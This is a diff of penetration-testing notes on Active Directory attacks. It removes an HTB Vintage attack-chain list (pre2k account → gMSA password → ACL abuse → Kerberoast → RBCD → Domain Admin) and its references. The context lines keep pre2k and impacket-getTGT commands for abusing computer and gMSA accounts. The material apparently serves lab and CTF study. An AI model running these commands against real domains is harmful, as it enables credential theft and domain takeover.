@@ -134,8 +134,6 @@ pipx install git+https://github.com/garrettfoster13/pre2k
 pre2k unauth -d corp.local -dc-ip dc-ip -inputfile computers.txt -save
 ```
 
-**Post-compromise with pre2k computer account:**
-
 Once you have a privileged computer account TGT, enumerate what it can access:
 
 ```bash
@@ -151,18 +149,6 @@ KRB5CCNAME=COMPUTERNAME$.ccache \
 # Typical escalation: gMSA → WinRM/SMB as service account → further ACL abuse
 impacket-getTGT corp.local/gMSA_account$ -hashes :ntlm_hash -dc-ip dc-ip
 ```
-
-**Common attack chains seen in HTB Vintage:**
-1. Pre2k computer (`FS01$:fs01`) → ReadGMSAPassword on `gMSA01$` (via Domain Computers group)
-2. gMSA account → AddSelf/GenericWrite on ServiceManagers group
-3. ServiceManagers → GenericAll on service accounts → targeted Kerberoast
-4. Cracked service account → lateral movement → RBCD → DA
-
-**References:**
-- [HTB Vintage writeup (0xBEN)](https://benheater.com/hackthebox-vintage/) — Full pre2k → gMSA → DA chain
-- [HTB Vintage writeup (InfoSec)](https://infosecwriteups.com/htb-vintage-machine-walkthrough-easy-hackthebox-guide-for-beginners-c39008aa3e16) — Step-by-step with bloodyAD
-- [The Hacker Recipes: Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers) — Detection & exploitation
-- [Semperis: Pre-Windows 2000 Compatibility Risks](https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/) — Enterprise impact
 
 ### LSASS / SAM Dumping
 
